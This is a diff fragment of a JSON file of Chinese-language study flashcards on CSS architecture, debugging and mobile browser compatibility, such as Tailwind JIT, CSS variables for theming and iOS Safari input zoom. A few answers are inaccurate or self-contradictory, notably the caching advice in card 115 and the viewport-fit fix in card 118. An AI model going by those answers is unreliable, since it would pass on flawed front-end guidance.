+      "back_explanation": "结论：CSS 是渲染阻塞资源，加载完成前不渲染页面。\n核心机制：\n1. 查看 CSS 请求结束到 FCP 的时间差。\n2. 大体积 CSS 会显著推迟首屏。\n最佳实践：提取 Critical CSS 内联，非关键 CSS 异步加载。",
+      "difficulty": "advanced",
+      "tags": ["Debugging", "Network", "Critical CSS"]
+    },
+    {
+      "id": "css_ui-flashcard-106",
+      "front_concept": "Computed Style 面板中 CSS 变量显示为最终计算值，如何查看其原始定义来源？",
+      "hints": ["变量追踪", "继承链", "源映射"],
+      "back_explanation": "结论：点击变量值可跳转到定义该变量的规则处。\n核心机制：\n1. 变量可继承，需区分本地定义与继承。\n2. 支持查看变量 fallback 值。\n最佳实践：调试主题切换问题时，追踪变量继承链定位覆盖源。",
+      "difficulty": "intermediate",
+      "tags": ["Debugging", "Variables", "DevTools"]
+    },
+    {
+      "id": "css_ui-flashcard-107",
+      "front_concept": "CSS-in-JS (如 Emotion) 与 Utility-First (如 Tailwind) 在运行时性能上的本质差异？",
+      "hints": ["运行时注入", "构建时生成", "样式解析"],
+      "back_explanation": "结论：CSS-in-JS 有运行时注入开销，Tailwind 为零运行时。\n核心机制：\n1. CSS-in-JS 需在浏览器执行 JS 生成 style 标签。\n2. Tailwind 预生成静态 CSS 文件。\n最佳实践：高性能需求选 Tailwind，动态主题强需求选 CSS-in-JS。",
+      "difficulty": "advanced",
+      "tags": ["Architecture", "CSS-in-JS", "Tailwind"]
+    },
+    {
+      "id": "css_ui-flashcard-108",
+      "front_concept": "Tailwind JIT 模式相比传统 PurgeCSS 在样式生成上的优势？",
+      "hints": ["按需生成", "构建速度", "任意值"],
+      "back_explanation": "结论：JIT 即时编译，支持任意值且构建更快。\n核心机制：\n1. 扫描模板动态生成所需 CSS。\n2. 无需维护白名单，支持 w-[123px] 语法。\n最佳实践：大型项目开启 JIT，避免全量 CSS 打包。",
+      "difficulty": "advanced",
+      "tags": ["Architecture", "Tailwind", "JIT"]
+    },
+    {
+      "id": "css_ui-flashcard-109",
+      "front_concept": "Design Token 通过 CSS Variables 实现多主题切换，相比 JS 操作 style 对象的优势？",
+      "hints": ["声明式", "性能开销", "样式隔离"],
+      "back_explanation": "结论：CSS 变量切换仅触发样式重算，无需 JS 重渲染。\n核心机制：\n1. JS 操作 style 可能触发 React/Vue 更新。\n2. CSS 变量在浏览器内部高效更新。\n最佳实践：主题切换优先修改变量值，而非切换类名或重绘组件。",
+      "difficulty": "advanced",
+      "tags": ["Architecture", "Design Tokens", "Theming"]
+    },
+    {
+      "id": "css_ui-flashcard-110",
+      "front_concept": "PostCSS Autoprefixer 配置过高（如 IE10）会导致什么构建产物问题？",
+      "hints": ["前缀冗余", "文件体积", "维护成本"],
+      "back_explanation": "结论：生成大量无用厂商前缀，增加 CSS 体积。\n核心机制：\n1. 基于 browserslist 配置添加前缀。\n2. 过时浏览器支持导致代码膨胀。\n最佳实践：根据实际用户数据配置 browserslist，定期清理旧前缀。",
+      "difficulty": "advanced",
+      "tags": ["Architecture", "PostCSS", "Build"]
+    },
+    {
+      "id": "css_ui-flashcard-111",
+      "front_concept": "CSS Modules 的类名哈希策略在长期缓存中的潜在风险？",
+      "hints": ["哈希稳定性", "内容指纹", "缓存失效"],
+      "back_explanation": "结论：若哈希基于内容，修改样式会导致类名变化，缓存失效。\n核心机制：\n1. 类名变化导致 HTML 结构变化。\n2. 影响长期缓存命中率。\n最佳实践：生产环境使用内容哈希，开发环境使用可读名，配合指纹策略。",
+      "difficulty": "advanced",
+      "tags": ["Architecture", "CSS Modules", "Caching"]
+    },
+    {
+      "id": "css_ui-flashcard-112",
+      "front_concept": "Critical CSS 提取策略中，如何平衡内联体积与首屏渲染速度？",
+      "hints": ["首屏样式", "异步加载", "阈值控制"],
+      "back_explanation": "结论：仅内联首屏可见区域样式，其余异步加载。\n核心机制：\n1. 减少渲染阻塞资源大小。\n2. 过大会增加 HTML 体积，过小会导致闪烁。\n最佳实践：控制内联在 14KB 以内，使用 loadCSS 异步加载剩余。",
+      "difficulty": "advanced",
+      "tags": ["Architecture", "Critical CSS", "Performance"]
+    },
+    {
+      "id": "css_ui-flashcard-113",
+      "front_concept": "大型应用中 CSS 按路由拆分（Chunking）相比全局打包的优势与陷阱？",
+      "hints": ["按需加载", "样式闪烁", "公共提取"],
+      "back_explanation": "结论：减少初始加载体积，但可能导致路由切换时样式闪烁。\n核心机制：\n1. 新路由 CSS 未加载完成前页面无样式。\n2. 需提取公共样式避免重复。\n最佳实践：提取全局基础样式，路由级样式预加载或配合 Loading 状态。",
+      "difficulty": "advanced",
+      "tags": ["Architecture", "Chunking", "SPA"]
+    },
+    {
+      "id": "css_ui-flashcard-114",
+      "front_concept": "主题切换方案中，切换 html 类名与修改 CSS 变量性能差异？",
+      "hints": ["样式重算", "作用域", "批量更新"],
+      "back_explanation": "结论：修改变量性能更优，切换类名可能触发多次重算。\n核心机制：\n1. 类名切换可能涉及多个选择器匹配。\n2. 变量修改直接更新值，浏览器优化更好。\n最佳实践：优先使用 data-theme 属性配合变量，避免大规模类名切换。",
+      "difficulty": "advanced",
+      "tags": ["Architecture", "Theming", "Performance"]
+    },
+    {
+      "id": "css_ui-flashcard-115",
+      "front_concept": "iOS WebView 中 CSS 文件缓存导致样式不更新，除了改文件名外的 Cache-Control 策略？",
+      "hints": ["强缓存", "协商缓存", "版本参数"],
+      "back_explanation": "结论：iOS WebView 对 CSS 缓存极其激进，需配合版本参数。\n核心机制：\n1. 仅改文件名可能因重定向失效。\n2. 需设置 no-cache 强制校验 ETag。\n最佳实践：CSS 文件名带 hash，服务器配置 Cache-Control: max-age=31536000, immutable。",
+      "difficulty": "advanced",
+      "tags": ["Compatibility", "iOS", "Cache"]
+    },
+    {
+      "id": "css_ui-flashcard-116",
+      "front_concept": "Android 低版本 WebView 对 100vh 计算包含状态栏，导致内容被遮挡的修复方案？",
+      "hints": ["视口高度", "JS 计算", "环境变量"],
+      "back_explanation": "结论：100vh 包含浏览器地址栏，需用 JS 计算可视高度。\n核心机制：\n1. 旧版 Android 不支持 dvh 单位。\n2. 需监听 resize 获取 window.innerHeight。\n最佳实践：使用 --vh 变量配合 JS 动态赋值，兼容旧设备。",
+      "difficulty": "advanced",
+      "tags": ["Compatibility", "Android", "Viewport"]
+    },
+    {
+      "id": "css_ui-flashcard-117",
+      "front_concept": "Safari 触摸设备上 :hover 态点击后持久不灭，如何清除？",
+      "hints": ["状态残留", "触摸事件", "空白点击"],
+      "back_explanation": "结论：触摸设备将 hover 视为点击状态，需二次点击或点击空白清除。\n核心机制：\n1. Safari 为模拟鼠标行为保留 hover。\n2. 影响用户体验，按钮看似按下。\n最佳实践：媒体查询中针对 pointer: coarse 禁用 hover 效果，或用 active 替代。",
+      "difficulty": "advanced",
+      "tags": ["Compatibility", "Safari", "Touch"]
+    },
+    {
+      "id": "css_ui-flashcard-118",
+      "front_concept": "iOS Safari 中输入框获取焦点时页面自动放大，如何禁止？",
+      "hints": ["字体大小", "缩放行为", "最小阈值"],
+      "back_explanation": "结论：字体小于 16px 时 iOS 会自动放大页面。\n核心机制：\n1. 为保证可读性，系统强制缩放。\n2. 导致布局错位。\n最佳实践：输入框字体设置为 16px 及以上，或使用 viewport-fit 控制。",
+      "difficulty": "advanced",
+      "tags": ["Compatibility", "iOS", "Input"]
+    },
+    {
+      "id": "css_ui-flashcard-119",
+      "front_concept": "Android Chrome 中 textarea 滚动时光标位置偏移的 Bug 成因及规避？",
+      "hints": ["渲染同步", "光标层", "固定高度"],
+      "back_explanation": "结论：光标层与文本渲染层不同步，导致视觉偏移。\n核心机制：\n1. 旧版 Android 内核渲染缺陷。\n2. 滚动时光标未重绘。\n最佳实践：避免 textarea 内部滚动，使用外部容器滚动或固定高度。",
+      "difficulty": "advanced",
+      "tags": ["Compatibility", "Android", "Textarea"]
+    },
+    {
+      "id": "css_ui-flashcard-120",
+      "front_concept": "Flexbox gap 属性在 iOS Safari < 14 中的兼容性替代方案？",
+      "hints": ["前缀支持", "margin 模拟", "选择器"],
+      "back_explanation": "结论：旧版 Safari 不支持 Flex gap，需用 margin 模拟。\n核心机制：\n1. 仅 Grid 支持 gap，Flex 不支持。\n2. 需计算负 margin 容器或 :not(:last-child)。\n最佳实践：使用 PostCSS 插件自动降级，或接受渐进增强。",
+      "difficulty": "advanced",
+      "tags": ["Compatibility", "Flexbox", "Safari"]
+    }
+  ]
+}
